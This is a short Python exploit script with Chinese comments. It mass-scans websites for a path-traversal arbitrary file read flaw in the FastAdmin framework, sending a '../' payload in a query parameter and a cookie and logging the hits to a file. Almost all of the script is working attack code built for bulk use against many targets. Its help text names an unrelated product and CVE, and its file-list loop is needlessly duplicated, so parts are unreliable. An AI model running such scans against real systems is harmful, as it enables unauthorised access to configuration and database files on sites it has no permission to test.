#Fastadmin框架存在任意文件读取漏洞
#icon_hash="-1036943727"
import requests,sys,argparse,time
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parser = argparse.ArgumentParser(description="ShokoServer /api/Image/withpath/ 任意文件读取漏洞(CVE-2023-43662)")

    parser.add_argument('-u','--url',dest='url',type=str,help='please input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list = []
                with open(args.file,'r',encoding='utf-8') as f:
                    for line in f.readlines():
                        url_list.append(line.strip())
                    mp = Pool(100)
                    mp.map(poc,url_list)
                    mp.close()
                    mp.join()
    else:
        print(f'Usage:{sys.argv[0]} -h or --help')

def poc(target):
    payload = '/index/ajax/lang?lang=..//..//application/database'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Cookie': 'think_var=..%2F%2F..%2F%2Fapplication%2Fdatabase',
        'Host': '',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    try:
        res1 = requests.get(target + payload, headers=headers, verify=False, timeout=6)
        if 'fonts' in res1.text:
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
    except Exception as e:
        print(e)


# 程序入口
if __name__ == '__main__':
    main()